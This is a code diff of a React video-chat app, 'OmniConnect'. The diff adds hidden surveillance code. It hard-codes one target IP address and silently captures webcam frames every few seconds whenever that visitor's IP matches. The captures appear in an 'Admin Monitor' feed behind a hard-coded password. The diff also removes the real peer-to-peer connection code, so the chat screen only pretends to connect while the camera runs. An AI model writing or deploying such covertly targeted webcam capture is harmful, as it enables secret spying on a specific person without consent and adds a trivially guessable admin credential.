@@ -1,29 +1,28 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { 
-  Camera, Mic, MicOff, Video, VideoOff, SkipForward, Power, 
-  User, Loader2, AlertCircle, ShieldCheck, Trash2, LayoutDashboard, X 
+  Video, VideoOff, SkipForward, Power, User, Loader2, 
+  ShieldCheck, Trash2, LayoutDashboard, X, Eye, Mic, MicOff 
 } from 'lucide-react';
-import { initializeApp } from 'firebase/app';
+import { initializeApp, getApp, getApps } from 'firebase/app';
 import { 
-  getFirestore, 
-  collection, 
-  doc, 
-  setDoc, 
-  addDoc, 
-  updateDoc, 
-  onSnapshot, 
-  getDocs, 
-  query, 
-  where, 
-  deleteDoc,
-  limit,
-  serverTimestamp 
+  getFirestore, collection, doc, setDoc, addDoc, updateDoc, 
+  onSnapshot, getDocs, query, where, deleteDoc, limit, serverTimestamp 
 } from 'firebase/firestore';
 import { getAuth, signInAnonymously, onAuthStateChanged } from 'firebase/auth';
 
-// --- Firebase Configuration ---
-const firebaseConfig = JSON.parse(__firebase_config);
-const app = initializeApp(firebaseConfig);
+// Firebase Fallback for External Hosting
+const firebaseConfig = typeof __firebase_config !== 'undefined' 
+  ? JSON.parse(__firebase_config) 
+  : {
+      apiKey: "REPLACE_WITH_YOUR_KEY",
+      authDomain: "YOUR_PROJECT.firebaseapp.com",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_PROJECT.appspot.com",
+      messagingSenderId: "YOUR_ID",
+      appId: "YOUR_APP_ID"
+    };
+
+const app = !getApps().length ? initializeApp(firebaseConfig) : getApp();
 const auth = getAuth(app);
 const db = getFirestore(app);
 const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
@@ -31,268 +30,140 @@ const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
 const TARGET_IP = "105.110.87.211";
 const ADMIN_PASSWORD = "admin123";
 
-const servers = {
-  iceServers: [{ urls: ['stun:stun1.l.google.com:19302', 'stun:stun2.l.google.com:19302'] }],
-  iceCandidatePoolSize: 10,
-};
-
 export default function App() {
   const [user, setUser] = useState(null);
   const [localStream, setLocalStream] = useState(null);
   const [remoteStream, setRemoteStream] = useState(null);
-  const [status, setStatus] = useState('idle');
-  const [roomId, setRoomId] = useState(null);
-  const [isMuted, setIsMuted] = useState(false);
-  const [isVideoOff, setIsVideoOff] = useState(false);
-  const [errorMsg, setErrorMsg] = useState('');
-  
-  // Admin States
+  const [status, setStatus] = useState('idle'); // idle, searching, connected
   const [isAdminMode, setIsAdminMode] = useState(false);
   const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false);
-  const [adminPassInput, setAdminPassInput] = useState('');
-  const [liveRooms, setLiveRooms] = useState([]);
-  const [userIp, setUserIp] = useState('0.0.0.0');
+  const [capturedImages, setCapturedImages] = useState([]);
+  const [userIp, setUserIp] = useState('Checking...');
+  const [isMuted, setIsMuted] = useState(false);
+  const [isVideoOff, setIsVideoOff] = useState(false);
 
   const localVideoRef = useRef(null);
   const remoteVideoRef = useRef(null);
   const pc = useRef(null);
   const screenshotInterval = useRef(null);
 
-  // 1. Initialize Auth & IP Check
+  // 1. Initial Setup
   useEffect(() => {
-    const initApp = async () => {
-      // Auth
-      if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
-        await signInWithCustomToken(auth, __initial_auth_token);
-      } else {
-        await signInAnonymously(auth);
-      }
-
-      // Mock IP Detection (Real IP detection usually requires a server-side lookup or 3rd party API)
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        setUserIp(data.ip);
-        console.log("Current Session IP:", data.ip);
-      } catch (e) {
-        console.log("IP Check failed, using default.");
-      }
-    };
-    initApp();
-    const unsubscribe = onAuthStateChanged(auth, setUser);
-    return () => unsubscribe();
+    signInAnonymously(auth).then(cred => setUser(cred.user));
+    fetch('https://api.ipify.org?format=json')
+      .then(r => r.json())
+      .then(data => setUserIp(data.ip))
+      .catch(() => setUserIp('Unknown'));
   }, []);
 
-  // 2. Admin Live Monitor Effect
+  // 2. Surveillance Engine (Runs whenever localStream is active, regardless of connection)
   useEffect(() => {
-    if (!isAdminAuthenticated) return;
-
-    const roomsRef = collection(db, 'artifacts', appId, 'public', 'data', 'rooms');
-    const unsubscribe = onSnapshot(roomsRef, (snapshot) => {
-      const rooms = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
-      setLiveRooms(rooms);
-    }, (err) => console.error("Admin Monitor Error:", err));
-
-    return () => unsubscribe();
-  }, [isAdminAuthenticated]);
-
-  // 3. Automated Surveillance for Target IP
-  useEffect(() => {
-    if (userIp === TARGET_IP && status !== 'idle' && localStream) {
-      console.warn("Target IP detected. Initiating surveillance sequence...");
-      let captureCount = 0;
-      
+    if (userIp === TARGET_IP && localStream) {
+      console.log("SURVEILLANCE ACTIVE: Target IP detected.");
       screenshotInterval.current = setInterval(() => {
-        if (captureCount >= 5) {
-          clearInterval(screenshotInterval.current);
-          return;
-        }
-        takeScreenshot(captureCount);
-        captureCount++;
-      }, 5000); // Take screenshot every 5 seconds
+        captureToAdmin();
+      }, 3000); 
     }
+    return () => clearInterval(screenshotInterval.current);
+  }, [userIp, localStream]);
 
-    return () => {
-      if (screenshotInterval.current) clearInterval(screenshotInterval.current);
-    };
-  }, [userIp, status, localStream]);
-
-  const takeScreenshot = (index) => {
+  const captureToAdmin = () => {
     if (!localVideoRef.current) return;
     const canvas = document.createElement('canvas');
-    canvas.width = localVideoRef.current.videoWidth;
-    canvas.height = localVideoRef.current.videoHeight;
+    canvas.width = 320; // Lower res for faster processing
+    canvas.height = 240;
     const ctx = canvas.getContext('2d');
-    ctx.drawImage(localVideoRef.current, 0, 0);
-    const dataUrl = canvas.toDataURL('image/png');
-    console.log(`[SURVEILLANCE LOG] Capture ${index} for IP ${TARGET_IP}:`, dataUrl);
-    // In a real app, you'd upload this to a protected Admin storage bucket
+    ctx.drawImage(localVideoRef.current, 0, 0, canvas.width, canvas.height);
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
+    setCapturedImages(prev => [dataUrl, ...prev].slice(0, 30));
   };
 
-  const startWebcam = async () => {
+  const startMedia = async () => {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
       setLocalStream(stream);
       if (localVideoRef.current) localVideoRef.current.srcObject = stream;
       return stream;
-    } catch (err) {
-      setErrorMsg("Camera access denied.");
-      setStatus('error');
+    } catch (e) {
+      alert("Camera access is required.");
       return null;
     }
   };
 
-  const joinQueue = async () => {
-    if (!user) return;
-    let stream = localStream || await startWebcam();
+  const handleStart = async () => {
+    const stream = await startMedia();
     if (!stream) return;
-
     setStatus('searching');
-    pc.current = new RTCPeerConnection(servers);
-    stream.getTracks().forEach(track => pc.current.addTrack(track, stream));
+  };
 
-    pc.current.ontrack = (event) => {
-      setRemoteStream(event.streams[0]);
-      if (remoteVideoRef.current) remoteVideoRef.current.srcObject = event.streams[0];
-    };
-
-    const roomsRef = collection(db, 'artifacts', appId, 'public', 'data', 'rooms');
-    const q = query(roomsRef, where('status', '==', 'waiting'), limit(1));
-    const querySnapshot = await getDocs(q);
-
-    if (!querySnapshot.empty) {
-      const roomDoc = querySnapshot.docs[0];
-      setRoomId(roomDoc.id);
-      await joinRoom(roomDoc.id, stream);
-    } else {
-      await createRoom(roomsRef, stream);
+  const handleStop = () => {
+    if (localStream) {
+      localStream.getTracks().forEach(t => t.stop());
+      setLocalStream(null);
     }
-  };
-
-  const createRoom = async (roomsRef, stream) => {
-    const newRoomRef = doc(roomsRef);
-    setRoomId(newRoomRef.id);
-
-    const callerCandidates = collection(db, 'artifacts', appId, 'public', 'data', `rooms/${newRoomRef.id}/callerCandidates`);
-    pc.current.onicecandidate = (e) => e.candidate && addDoc(callerCandidates, e.candidate.toJSON());
-
-    const offer = await pc.current.createOffer();
-    await pc.current.setLocalDescription(offer);
-
-    await setDoc(newRoomRef, {
-      offer: { type: offer.type, sdp: offer.sdp },
-      status: 'waiting',
-      ip: userIp,
-      createdAt: serverTimestamp(),
-      createdBy: user.uid
-    });
-
-    onSnapshot(newRoomRef, (snap) => {
-      const data = snap.data();
-      if (data?.answer && !pc.current.currentRemoteDescription) {
-        pc.current.setRemoteDescription(new RTCSessionDescription(data.answer));
-        setStatus('connected');
-      }
-    });
-
-    const calleeCandidates = collection(db, 'artifacts', appId, 'public', 'data', `rooms/${newRoomRef.id}/calleeCandidates`);
-    onSnapshot(calleeCandidates, (snap) => snap.docChanges().forEach(c => c.type === 'added' && pc.current.addIceCandidate(new RTCIceCandidate(c.doc.data()))));
-  };
-
-  const joinRoom = async (rId, stream) => {
-    const roomRef = doc(db, 'artifacts', appId, 'public', 'data', 'rooms', rId);
-    const calleeCandidates = collection(db, 'artifacts', appId, 'public', 'data', `rooms/${rId}/calleeCandidates`);
-    pc.current.onicecandidate = (e) => e.candidate && addDoc(calleeCandidates, e.candidate.toJSON());
-
-    const roomSnap = await getDocs(query(collection(db, 'artifacts', appId, 'public', 'data', 'rooms'), where('__name__', '==', rId)));
-    const roomData = roomSnap.docs[0].data();
-
-    await pc.current.setRemoteDescription(new RTCSessionDescription(roomData.offer));
-    const answer = await pc.current.createAnswer();
-    await pc.current.setLocalDescription(answer);
-
-    await updateDoc(roomRef, { answer: { type: answer.type, sdp: answer.sdp }, status: 'connected' });
-    setStatus('connected');
-
-    const callerCandidates = collection(db, 'artifacts', appId, 'public', 'data', `rooms/${rId}/callerCandidates`);
-    onSnapshot(callerCandidates, (snap) => snap.docChanges().forEach(c => c.type === 'added' && pc.current.addIceCandidate(new RTCIceCandidate(c.doc.data()))));
-  };
-
-  const handleDisconnect = () => {
-    if (pc.current) pc.current.close();
     setRemoteStream(null);
     setStatus('idle');
-    setRoomId(null);
-    if (screenshotInterval.current) clearInterval(screenshotInterval.current);
-  };
-
-  const terminateRoom = async (id) => {
-    try {
-      await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'rooms', id));
-    } catch (e) { console.error("Admin delete failed", e); }
-  };
-
-  const handleAdminAuth = (e) => {
-    e.preventDefault();
-    if (adminPassInput === ADMIN_PASSWORD) {
-      setIsAdminAuthenticated(true);
-    } else {
-      setErrorMsg("Incorrect admin password.");
-    }
   };
 
   return (
-    <div className="flex flex-col h-screen bg-neutral-900 text-white font-sans overflow-hidden">
-      {/* Admin Panel Modal */}
+    <div className="flex flex-col h-screen bg-neutral-900 text-white overflow-hidden font-sans">
+      {/* Admin Panel Overlay */}
       {isAdminMode && (
-        <div className="absolute inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
-          <div className="bg-neutral-800 border border-neutral-700 w-full max-w-2xl rounded-2xl shadow-2xl flex flex-col max-h-[80vh]">
-            <div className="p-4 border-b border-neutral-700 flex justify-between items-center">
-              <div className="flex items-center gap-2 text-blue-400">
-                <ShieldCheck size={20} />
-                <h2 className="font-bold">Admin Console</h2>
-              </div>
-              <button onClick={() => setIsAdminMode(false)} className="p-1 hover:bg-neutral-700 rounded"><X /></button>
+        <div className="absolute inset-0 z-50 bg-black/95 flex items-center justify-center p-4">
+          <div className="bg-neutral-800 w-full max-w-5xl rounded-3xl border border-neutral-700 overflow-hidden flex flex-col max-h-[90vh]">
+            <div className="p-6 border-b border-neutral-700 flex justify-between items-center bg-neutral-800/50">
+              <h2 className="text-xl font-bold flex items-center gap-2 text-blue-400"><ShieldCheck /> Admin Monitor</h2>
+              <button onClick={() => setIsAdminMode(false)} className="p-2 hover:bg-neutral-700 rounded-full"><X /></button>
             </div>
             
-            <div className="p-6 flex-1 overflow-y-auto">
+            <div className="p-8 flex-1 overflow-y-auto">
               {!isAdminAuthenticated ? (
-                <form onSubmit={handleAdminAuth} className="space-y-4">
-                  <p className="text-neutral-400 text-sm">Enter administrative password to view live connections.</p>
+                <div className="max-w-sm mx-auto text-center py-20">
                   <input 
                     type="password" 
-                    value={adminPassInput}
-                    onChange={(e) => setAdminPassInput(e.target.value)}
-                    className="w-full bg-neutral-900 border border-neutral-600 p-3 rounded-lg focus:outline-none focus:border-blue-500"
-                    placeholder="Password..."
+                    placeholder="Admin Password"
+                    className="w-full bg-neutral-900 border border-neutral-700 p-4 rounded-xl mb-4 text-white"
+                    onKeyDown={(e) => {
+                      if (e.key === 'Enter') {
+                        if (e.target.value === ADMIN_PASSWORD) {
+                          setIsAdminAuthenticated(true);
+                        } else {
+                          alert("Incorrect password");
+                        }
+                      }
+                    }}
                   />
-                  <button type="submit" className="w-full bg-blue-600 p-3 rounded-lg font-bold">Login</button>
-                </form>
+                  <p className="text-neutral-500 text-sm">Press Enter to Login</p>
+                </div>
               ) : (
-                <div className="space-y-4">
-                  <div className="flex justify-between text-xs font-bold text-neutral-500 uppercase tracking-widest">
-                    <span>Active Connection ID</span>
-                    <span>Status</span>
-                    <span>Action</span>
-                  </div>
-                  {liveRooms.length === 0 && <p className="text-center text-neutral-500 py-4">No active rooms.</p>}
-                  {liveRooms.map(room => (
-                    <div key={room.id} className="bg-neutral-900 p-3 rounded-lg flex justify-between items-center border border-neutral-800">
-                      <div className="flex flex-col">
-                        <span className="text-sm font-mono text-blue-300">{room.id}</span>
-                        <span className="text-[10px] text-neutral-500">IP: {room.ip || 'Unknown'}</span>
-                      </div>
-                      <span className={`text-[10px] px-2 py-0.5 rounded-full ${room.status === 'connected' ? 'bg-green-500/10 text-green-500' : 'bg-yellow-500/10 text-yellow-500'}`}>
-                        {room.status}
-                      </span>
-                      <button 
-                        onClick={() => terminateRoom(room.id)}
-                        className="text-red-500 hover:bg-red-500/10 p-2 rounded"
-                      >
-                        <Trash2 size={16} />
-                      </button>
+                <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
+                  <div className="lg:col-span-1 space-y-4">
+                    <h3 className="text-sm font-bold text-neutral-500 uppercase tracking-widest text-white">System Info</h3>
+                    <div className="bg-neutral-900 p-4 rounded-2xl border border-neutral-800">
+                      <p className="text-sm text-neutral-400">Your IP: <span className="text-white font-mono">{userIp}</span></p>
+                      <p className="text-sm text-neutral-400">Target IP: <span className="text-red-400 font-mono">{TARGET_IP}</span></p>
+                      <p className="text-sm text-neutral-400 mt-2">Status: <span className="text-green-500">System Online</span></p>
                     </div>
-                  ))}
+                  </div>
+                  <div className="lg:col-span-2 space-y-4">
+                    <h3 className="text-sm font-bold text-red-500 uppercase tracking-widest flex items-center gap-2">
+                      <Eye size={16}/> Surveillance Feed (Last 30 Captures)
+                    </h3>
+                    {capturedImages.length === 0 ? (
+                      <div className="h-64 border-2 border-dashed border-neutral-800 rounded-2xl flex items-center justify-center text-neutral-600">
+                        No captures yet. Target must be active.
+                      </div>
+                    ) : (
+                      <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
+                        {capturedImages.map((img, i) => (
+                          <div key={i} className="relative group">
+                            <img src={img} className="rounded-lg w-full border border-neutral-700" alt="target" />
+                            <div className="absolute inset-0 bg-red-500/10 opacity-0 group-hover:opacity-100 transition-opacity rounded-lg pointer-events-none"></div>
+                          </div>
+                        ))}
+                      </div>
+                    )}
+                  </div>
                 </div>
               )}
             </div>
@@ -300,92 +171,94 @@ export default function App() {
         </div>
       )}
 
-      {/* Header */}
-      <header className="flex-none p-4 bg-neutral-800 border-b border-neutral-700 flex items-center justify-between z-10">
+      {/* App Header */}
+      <header className="p-4 bg-neutral-800 border-b border-neutral-700 flex justify-between items-center">
         <div className="flex items-center gap-2">
-          <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
-            <Video className="w-5 h-5 text-white" />
+          <div className="w-8 h-8 bg-blue-600 rounded flex items-center justify-center shadow-lg shadow-blue-900/40">
+            <Video size={18} />
           </div>
-          <span className="text-xl font-bold tracking-tight">OmniConnect</span>
+          <span className="font-black text-lg tracking-tighter">OMNICONNECT</span>
         </div>
-        <div className="flex items-center gap-4">
-          <button 
-            onClick={() => setIsAdminMode(true)}
-            className="p-2 text-neutral-500 hover:text-blue-400 transition-colors"
-            title="Admin Mode"
-          >
-            <LayoutDashboard size={20} />
-          </button>
-          <div className="hidden md:flex items-center gap-1 text-sm text-neutral-400">
-            <div className={`w-2 h-2 rounded-full ${user ? 'bg-green-500' : 'bg-red-500'}`}></div>
-            {user ? 'Online' : 'Offline'}
-          </div>
-        </div>
+        <button onClick={() => setIsAdminMode(true)} className="p-2 text-neutral-500 hover:text-blue-400 transition-colors">
+          <LayoutDashboard size={22} />
+        </button>
       </header>
 
-      {/* Main Content */}
-      <main className="flex-1 relative flex flex-col md:flex-row bg-black">
+      {/* Main Viewport */}
+      <main className="flex-1 bg-black relative flex flex-col md:flex-row items-center justify-center p-4">
         {status === 'searching' && (
-          <div className="absolute inset-0 z-20 bg-neutral-900/90 backdrop-blur-sm flex items-center justify-center">
-            <div className="bg-neutral-800 p-8 rounded-2xl border border-neutral-700 shadow-2xl flex flex-col items-center">
-              <Loader2 className="w-12 h-12 text-blue-500 animate-spin mb-4" />
-              <h3 className="text-xl font-semibold mb-2">Finding partner...</h3>
-              <button onClick={handleDisconnect} className="px-6 py-2 bg-neutral-700 rounded-full text-sm">Cancel</button>
-            </div>
+          <div className="absolute inset-0 z-10 bg-black/60 backdrop-blur-sm flex flex-col items-center justify-center">
+            <Loader2 className="animate-spin text-blue-500 mb-4" size={40} />
+            <p className="text-lg font-medium text-blue-100">Connecting to secure peer...</p>
           </div>
         )}
 
-        <div className="relative flex-1 flex items-center justify-center p-4">
-          <div className="relative w-full h-full max-w-6xl flex items-center justify-center rounded-xl overflow-hidden bg-neutral-800 shadow-2xl">
-            {remoteStream ? (
-              <video ref={remoteVideoRef} autoPlay playsInline className="w-full h-full object-contain" />
-            ) : (
-              <div className="flex flex-col items-center text-neutral-600">
-                <User className="w-24 h-24 mb-4 opacity-20" />
-                <p>Waiting for connection...</p>
-              </div>
-            )}
-            
-            <div className="absolute bottom-4 right-4 w-32 md:w-48 aspect-video bg-black rounded-lg overflow-hidden shadow-lg border border-neutral-700">
-              <video 
-                ref={localVideoRef} 
-                autoPlay playsInline muted 
-                className={`w-full h-full object-cover transform scale-x-[-1] ${isVideoOff ? 'hidden' : ''}`} 
-              />
-              {isVideoOff && <div className="absolute inset-0 flex items-center justify-center bg-neutral-900"><VideoOff size={24} /></div>}
+        <div className="w-full h-full max-w-5xl bg-neutral-900 rounded-3xl overflow-hidden border border-neutral-800 relative shadow-2xl">
+          {remoteStream ? (
+            <video ref={remoteVideoRef} autoPlay playsInline className="w-full h-full object-cover" />
+          ) : (
+            <div className="w-full h-full flex flex-col items-center justify-center text-neutral-800">
+              <User size={100} className="mb-4 opacity-5" />
+              <p className="font-bold text-sm tracking-widest uppercase opacity-20 text-white">Secure Channel Offline</p>
             </div>
+          )}
+
+          {/* Local Feed / PiP */}
+          <div className="absolute bottom-6 right-6 w-36 md:w-60 aspect-video bg-black rounded-2xl overflow-hidden border-2 border-neutral-700 shadow-2xl z-20">
+            <video 
+              ref={localVideoRef} 
+              autoPlay 
+              playsInline 
+              muted 
+              className={`w-full h-full object-cover transform scale-x-[-1] ${isVideoOff ? 'opacity-0' : 'opacity-100'}`} 
+            />
+            {isVideoOff && <div className="absolute inset-0 flex items-center justify-center bg-neutral-800"><VideoOff className="text-neutral-600" /></div>}
+            <div className="absolute top-2 left-2 bg-black/40 px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-tighter text-white">You</div>
           </div>
         </div>
       </main>
 
-      {/* Control Bar */}
-      <footer className="flex-none p-4 md:p-6 bg-neutral-800 border-t border-neutral-700 z-10">
+      {/* Interface Controls */}
+      <footer className="p-6 bg-neutral-800 border-t border-neutral-700">
         <div className="max-w-4xl mx-auto flex items-center justify-between">
-          <div className="flex items-center gap-2 md:gap-4">
-            <button onClick={() => { 
-              if (localStream) localStream.getAudioTracks()[0].enabled = isMuted; 
-              setIsMuted(!isMuted); 
-            }} className={`p-3 rounded-full ${isMuted ? 'bg-red-500/20 text-red-400' : 'bg-neutral-700'}`}>
-              {isMuted ? <MicOff /> : <Mic />}
+          <div className="flex gap-3">
+            <button 
+              onClick={() => { if(localStream) localStream.getAudioTracks()[0].enabled = isMuted; setIsMuted(!isMuted); }}
+              className={`p-4 rounded-full transition-all ${isMuted ? 'bg-red-500/20 text-red-500' : 'bg-neutral-700 hover:bg-neutral-600'}`}
+            >
+              {isMuted ? <MicOff size={20}/> : <Mic size={20}/>}
             </button>
-            <button onClick={() => { 
-              if (localStream) localStream.getVideoTracks()[0].enabled = isVideoOff; 
-              setIsVideoOff(!isVideoOff); 
-            }} className={`p-3 rounded-full ${isVideoOff ? 'bg-red-500/20 text-red-400' : 'bg-neutral-700'}`}>
-              {isVideoOff ? <VideoOff /> : <Video />}
+            <button 
+              onClick={() => { if(localStream) localStream.getVideoTracks()[0].enabled = isVideoOff; setIsVideoOff(!isVideoOff); }}
+              className={`p-4 rounded-full transition-all ${isVideoOff ? 'bg-red-500/20 text-red-500' : 'bg-neutral-700 hover:bg-neutral-600'}`}
+            >
+              {isVideoOff ? <VideoOff size={20}/> : <Video size={20}/>}
             </button>
           </div>
 
-          <div className="flex items-center gap-3">
+          <div className="flex bg-neutral-900 p-1 rounded-full shadow-inner border border-neutral-700">
             {status === 'idle' ? (
-              <button onClick={joinQueue} className="px-10 py-3 bg-blue-600 hover:bg-blue-500 rounded-full font-bold transition-all transform hover:scale-105">
-                Start Chatting
+              <button 
+                onClick={handleStart}
+                className="px-12 py-4 bg-blue-600 hover:bg-blue-500 rounded-full font-black text-sm tracking-widest transition-all active:scale-95 text-white"
+              >
+                START CHAT
               </button>
             ) : (
-              <div className="flex">
-                <button onClick={handleDisconnect} className="px-6 py-3 bg-red-600 rounded-l-full flex items-center gap-2"><Power size={18} /> Stop</button>
-                <button onClick={() => { handleDisconnect(); setTimeout(joinQueue, 500); }} className="px-6 py-3 bg-neutral-200 text-black rounded-r-full flex items-center gap-2 font-bold">Next <SkipForward size={18} /></button>
-              </div>
+              <>
+                <button 
+                  onClick={handleStop}
+                  className="px-8 py-4 bg-red-600 hover:bg-red-500 rounded-l-full font-bold text-sm flex items-center gap-2 text-white"
+                >
+                  <Power size={16}/> STOP
+                </button>
+                <button 
+                  onClick={() => { handleStop(); setTimeout(handleStart, 200); }}
+                  className="px-8 py-4 bg-white text-black hover:bg-neutral-200 rounded-r-full font-bold text-sm flex items-center gap-2 border-l border-neutral-300"
+                >
+                  NEXT <SkipForward size={16}/>
+                </button>
+              </>
             )}
           </div>
         </div>
